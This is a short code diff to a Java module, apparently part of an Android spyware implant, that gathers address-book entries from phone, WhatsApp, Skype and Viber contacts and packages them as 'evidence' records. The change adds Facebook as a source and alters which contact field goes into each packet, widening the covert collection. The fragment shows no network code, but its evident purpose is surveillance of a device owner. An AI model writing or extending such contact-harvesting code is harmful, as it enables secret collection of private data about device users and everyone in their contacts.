@@ -38,9 +38,12 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 	public static final int PHONE = 0x08;
 	public static final int WHATSAPP = 0x07;
+	public static final int FACEBOOK = 0x01;
 	public static final int SKYPE = 0x02;
 	public static final int VIBER = 0x0b;
 	public static final int LOCAL = 0x80000000;
+
+
 
 	private PickContact contact;
 	Markup markupContacts;
@@ -398,7 +401,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			Check.log(TAG + " (createEvidenceRemote) type: " + type + " id: " + id);
 		}
 
-		byte[] packet = preparePacket(type, id, c.number, c.name, c.display_name);
+		byte[] packet = preparePacket(type, id, c.number, c.name, c.extra);
 		boolean needToSerialize = serializeIfNew(id, packet);
 		if (needToSerialize) {
 			EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, packet);
